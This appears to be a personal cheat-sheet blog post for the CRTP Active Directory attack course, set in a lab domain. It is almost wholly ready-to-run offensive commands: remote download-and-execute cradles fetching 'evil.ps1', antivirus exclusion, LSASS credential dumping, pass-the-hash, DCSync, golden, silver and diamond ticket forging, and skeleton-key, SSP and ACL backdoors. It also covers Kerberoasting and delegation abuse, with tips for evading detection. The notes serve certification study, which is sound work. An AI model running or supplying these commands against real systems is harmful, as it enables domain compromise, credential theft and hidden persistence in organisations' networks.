---
title: CRTP Notes
date: 2024-12-29 19:40:44 +/-TTTT
categories: [Notes,CRTP]
tags: [CRTP,AD]     # TAG names should always be lowercase
image: /assets/img/CRTP.png
---

### Load a PowerShell script using dot sourcing

```
. C:\AD\Tools\PowerView.ps1
```

### Add Exclusion path to antivirus

```
 PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
```
### Download execute cradle

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

```powershell
$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1
');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```


```powershell

Method 1: 

PSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')

Method 2:

$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText

Method 3:

$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```


### Several ways to bypass ExecutionPolicy

```powershell
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

# Enumeration

### Get current domain

```powershell
Get-Domain
```

### Get object of another domain

```powershell
Get-Domain -Domain moneycorp.local
```

### Get domain SID for the current domain

```powershell
Get-DomainSID
```

### Get domain policy for the current domain

```powershell
Get-DomainPolicyData

(Get-DomainPolicyData).systemaccess

```

### Get domain policy for another domain


```powershell
(Get-DomainPolicyData -domain moneycorp.local).systemaccess

```

### Get domain controllers for the current domain

```powershell
Get-DomainController
```

### Get domain controllers for another domain

```powershell
Get-DomainController -Domain moneycorp.local
```

### Get a list of users in the current domain

```powershell
Get-DomainUser

Get-DomainUser -Identity student1
```

### Get list of all properties for users in the current domain

```powershell
Get-DomainUser -Identity student1 -Properties *

Get-DomainUser -Properties samaccountname,logonCount
```

### Search for a particular string in a user's attributes:

```powershell
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
```

### Get a list of computers in the current domain

```powershell
Get-DomainComputer | select Name

Get-DomainComputer -OperatingSystem "*Server 2022*"

Get-DomainComputer -Ping
```

### Get all the groups in the current domain

```powershell
Get-DomainGroup | select Name

Get-DomainGroup -Domain <targetdomain>
```

### Get all groups containing the word "admin" in group name

```powershell
Get-DomainGroup *admin*
```

### Get all the members of the Domain Admins group

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Get the group membership for a user:

```powershell
Get-DomainGroup -UserName "student1"
```

### List all the local groups on a machine (needs administrator privs on non-dc machines) :

```powershell
Get-NetLocalGroup -ComputerName dcorp-dc
```

### Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :

```powershell
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```

### Get actively logged users on a computer (needs local admin rights on the target)

```powershell
Get-NetLoggedon -ComputerName dcorp-adminsrv
```

### Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)

```powershell
Get-LoggedonLocal -ComputerName dcorp-adminsrv
```

### Get the last logged user on a computer (needs administrative rights and remote registry on the target)

```powershell
Get-LastLoggedOn -ComputerName dcorp-adminsrv
```

### Find shares on hosts in current domain.

```powershell
Invoke-ShareFinder -Verbose
```

### File share where studentx has Write permissions

```powershell
Import-Module C:\AD\Tools\PowerHuntShares.psm1

Get-DomainComputer | select -ExpandProperty dnshostname > servers.txt
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```

### Find sensitive files on computers in the domain

```powershell
Invoke-FileFinder -Verbose
```

### Get all fileservers of the domain

```powershell
Get-NetFileServer
```

# Domain Enumeration - GPO
### Get list of GPO in current domain.

```powershell
Get-DomainGPO

Get-DomainGPO -ComputerIdentity dcorp-user1
```

### Get GPO(s) which use Restricted Groups or groups.xml for interesting users

```powershell
Get-DomainGPOLocalGroup
```

### Get users which are in a local group of a machine using GPO

```powershell
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1
```

### Get machines where the given user is member of a specific group


```powershell
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
```

# Domain Enumeration - OU

### Get OUs in a domain

```powershell
Get-DomainOU
```

### Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU

```powershell
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"
```

# Domain Enumeration - ACL

### Get the ACLs associated with the specified object

```powershell
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
```

### Get the ACLs associated with the specified prefix to be used for search

```powershell
Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
```

### We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs

```powershell
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
```

### Search for interesting ACEs

```powershell
Find-InterestingDomainAcl -ResolveGUIDs
```

### Get the ACLs associated with the specified path

```powershell
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```

# Domain Enumeration - Trusts

## Domain Trust mapping

 - Get a list of all domain trusts for the current domain

```powershell
Get-DomainTrust

Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
```

## Forest mapping

- Get details about the current forest

```powershell
Get-Forest
Get-Forest -Forest eurocorp.local
``` 

- Get all domains in the current forest

```powershell
Get-ForestDomain
Get-ForestDomain -Forest eurocorp.local
```

- Get all global catalogs for the current forest

```powershell
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog -Forest eurocorp.local
```

- Map trusts of a forest (no Forest trusts in the lab)

```powershell
Get-ForestTrust
Get-ForestTrust -Forest eurocorp.local
```

# Domain Enumeration - User Hunting

### Find all machines on the current domain where the current user has local admin access

```powershell
Find-LocalAdminAccess -Verbose
```

```powershell
Find-WMILocalAdminAccess.ps1
```

```powershell
Find-PSRemotingLocalAdminAccess.ps1
```

### Find computers where a domain admin (or specified user/group) has sessions:

```powershell
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
```

### Find computers where a domain admin session is available and current user has admin access

```powershell
Test-AdminAccess

Find-DomainUserLocation -CheckAccess
```

### Find computers (File Servers and Distributed File servers) where a domain admin session is available.

```powershell
Find-DomainUserLocation -Stealth
```

### List sessions on remote machines

```powershell
Invoke-SessionHunter -FailSafe

Get-DomainComputer | select  dnshostname > servers.txt
Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt
```


# Privilege Escalation - Local

## Services Issues using PowerUp

```powershell
Invoke-AllChecks

Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\USERNAME'
```

- Get services with unquoted paths and a space in their name.

```powershell
Get-ServiceUnquoted -Verbose
```

- Get services where the current user can write to its binary path or change arguments to the binary

```powershell
Get-ModifiableServiceFile -Verbose
```

- Get the services whose configuration current user can modify.

```powershell
Get-ModifiableService -Verbose
```

- Privesc:
	Invoke-PrivEsc
- PEASS-ng:
	winPEASx64.exe


### BloodHound

```powershell
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound –Steatlh

# avoid detections like MDI
Invoke-BloodHound -ExcludeDCs

SharpHound.exe
SharpHound.exe –-steatlh

```


# Lateral Movement


## PowerShell Remoting

### Use below to execute commands or scriptblocks:

```powershell
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```


### Use below to execute scripts from files

```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

### Use below to execute locally loaded function on the remote machines:

```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

passing Arguments

```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

```powershell
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

```powershell
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```

# Extracting Credentials from LSASS

### Dump credentials on a local machine using Mimikatz.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::evasive-keys"'
```

### Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)

```powershell
SafetyKatz.exe "sekurlsa::evasive-keys"
```

### Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).

```powershell
SharpKatz.exe --Command ekeys
```

### Dump credentials using Dumpert (Direct System Calls and API unhooking)

```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

### Using pypykatz (Mimikatz functionality in Python)

```powershell
pypykatz.exe live lsa
```

### Using comsvcs.dll

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

# OverPass-The-Hash

### Over Pass the hash
- admin elevation

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
```

```powershell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```

```
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

- doesn't need elevation

```powershell
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

# Lateral Movement DCSync

#DCsync


### DCSync feature for getting krbtgt hash

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```


# Persistence - Golden Ticket

### Execute mimikatz (or a variant) on DC as DA to get krbtgt hash


```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

### DCSync feature for getting AES keys for krbtgt account

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

### Run the below command to create a Golden ticket on any machine that has network connectivity with DC:

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

![[Pasted image 20250126232023.png]]
![[Pasted image 20250126232038.png]]

### Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:

```powershell
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

### Golden ticket forging command

```powershell
C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```
![[Pasted image 20250126232214.png]]
![[Pasted image 20250126232229.png]]


# Persistence - Silver Ticket


### Using hash of the Domain Controller computer account

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

![[Pasted image 20250126232323.png]]
![[Pasted image 20250126232331.png]]


### Forge a Silver ticket.

```powershell
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

# Persistence - Diamond Ticket

need krbtgt AES keys

- Rubeus command 
```powershell
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

- usage  /tgtdeleg
```powershell
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

# Persistence - Skeleton Key

### command to inject a skeleton key

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

- possible to access any machine with a valid username and password as "mimikatz"

```powershell
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```

# Persistence - DSRM


### Dump DSRM password (needs DA privs)

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```

### Compare the Administrator hash with the Administrator

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

Logon Behavior for the DSRM account needs to be changed
before we can use its hash

```powershell
Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

### command to pass the hash

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

ls \\dcorp-dc\C$
```

# Persistence - Custom SSP

### We can use either of the ways:

- Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' 

$packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value 

$packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```


### Persistence using ACLs - AdminSDHolder

### Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

### Using ActiveDirectory Module and RACE toolkit

```powershell
(https://github.com/samratashok/RACE) :

Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```

### interesting permissions ResetPassword, WriteMembers) for a user to the AdminSDHolder:

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

### Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:

```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

### For pre-Server 2008 machines:

```powershell
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

### Check the Domain Admins permission - PowerView as normal user:

```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
```


### Abusing FullControl using PowerView:

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

### Abusing ResetPassword using PowerView:

```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

### Persistence using ACLs - Rights Abuse
#### Add FullControl rights:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

#### Add rights for DCSync:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

### Execute DCSync:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
OR
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

# Persistence using ACLs - Security Descriptors - WMI

```powershell
ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit: 
	. C:\AD\Tools\RACE-master\RACE.ps1

• On local machine for student1:

Set-RemoteWMI -SamAccountName student1 -Verbose

• On remote machine for student1 without explicit credentials:

Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose

• On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:

Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose

• On remote machine remove permissions:

Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```

# Persistence using ACLs - Security Descriptors -
### PowerShell Remoting Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches
```powershell
• On local machine for student1:
Set-RemotePSRemoting -SamAccountName student1 -Verbose

• On remote machine for student1 without credentials:
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose

• On remote machine, remove the permissions:
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
```

# Persistence using ACLs - Security Descriptors - Remote Registry

```powershell

• Using RACE or DAMP, with admin privs on remote machine
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose

• As student1, retrieve machine account hash:
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

• Retrieve local account hash:
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose

• Retrieve domain cached credentials:
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

# Priv Esc - Kerberoast

```powershell
PowerView

Get-DomainUser -SPN
```

```powershell
• Use Rubeus to list Kerberoast stats
Rubeus.exe kerberoast /stats

• Use Rubeus to request a TGS
Rubeus.exe kerberoast /user:svcadmin /simple

• To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of
MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support
RC4_HMAC:

Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec

• Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

• Crack ticket using John the Ripper
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

# Priv Esc - Targeted Kerberoasting - AS-REPs

```powershell
• Enumerating accounts with Kerberos Preauth disabled

• Using PowerView:
Get-DomainUser -PreauthNotRequired -Verbose

• Using ActiveDirectory module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

• Force disable Kerberos Preauth:
• Let's enumerate the permissions for RDPUsers on ACLs using PowerView:

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose 

Get-DomainUser -PreauthNotRequired -Verbose


• Request encrypted AS-REP for offline brute-force.
• Let's use ASREPRoast

Get-ASREPHash -UserName VPN1user -Verbose

• To enumerate all users with Kerberos preauth disabled and request a
hash 

Invoke-ASREPRoast -Verbose

• We can use John The Ripper to brute-force the hashes offline

john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt

```

# Priv Esc - Targeted Kerberoasting - Set SPN

```powershell
• Lets enumerate the permissions for RDPUsers on ACLs using PowerView:

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

• Using Powerview, see if the user already has a SPN:
Get-DomainUser -Identity supportuser | select serviceprincipalname

• Using ActiveDirectory module: 

Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName

• Set a SPN for the user (must be unique for the domain)

Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}

• Using ActiveDirectory module:
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}

• Kerberoast the user
Rubeus.exe kerberoast /outfile:targetedhashes.txt
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```

# Priv Esc - Unconstrained Delegation

```powershell
• Discover domain computers which have unconstrained delegation
enabled using PowerView:

Get-DomainComputer -UnConstrained

• Using ActiveDirectory module:

Get-ADComputer -Filter {TrustedForDelegation -eq $True}

Get-ADUser -Filter {TrustedForDelegation -eq $True}

• Compromise the server(s) where Unconstrained delegation is enabled.
• We must trick or wait for a domain admin to connect a service on appsrv.
• Now, if the command is run again:

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

• The DA token could be reused:

Invoke-Mimikatz -Command '"kerberos::ptt

C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

```

# Priv Esc - Unconstrained Delegation - Printer Bug

```powershell
• We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:

Rubeus.exe monitor /interval:5 /nowrap

• And after that run MS-RPRN.exe
(https://github.com/leechristensen/SpoolSample) on the student VM:

MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

```

# Priv Esc - Unconstrained Delegation - Printer Bug

```powershell
• Copy the base64 encoded TGT remove extra spaces (if any) and use it
on the student VM:

Rubeus.exe ptt /tikcet:

• Once the ticket is injected, run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Priv Esc - Constrained Delegation

```powershell
• Enumerate users and computers with constrained delegation enabled, Using PowerView

  

Get-DomainUser -TrustedToAuth

Get-DomainComputer -TrustedToAuth

  

• Using ActiveDirectory module:

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

  

Abusing with Kekeo

• Either plaintext password or NTLM hash/AES keys is required. We already have

access to websvcs hash from dcorp-adminsrv

• Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):

  

kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f

  

• Using s4u from Kekeo, we request a TGS (steps 4 & 5):

  

tgs::s4u

/tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL

  
  

Abusing with Kekeo

• Using mimikatz, inject the ticket:

  

Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

  

• Abusing with Rubeus

• We can use the following command (We are requesting a TGT and TGS in a single command):

  

Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87

9470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt

  

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

  

Abusing with Kekeo

• Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash

• Using asktgt from Kekeo, we request a TGT:

  

tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67

  

• Using s4u from Kekeo_one (no SNAME validation):

  

tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL

  

Abusing with Kekeo

• Using mimikatz:

  

Invoke-Mimikatz -Command '"kerberos::ptt

TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'

  

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  
  

Abusing with Rubeus

• We can use the following command (We are requesting a TGT and TGS in a

single command):

  

Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

  

• After injection, we can run DCSync:

  

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"


```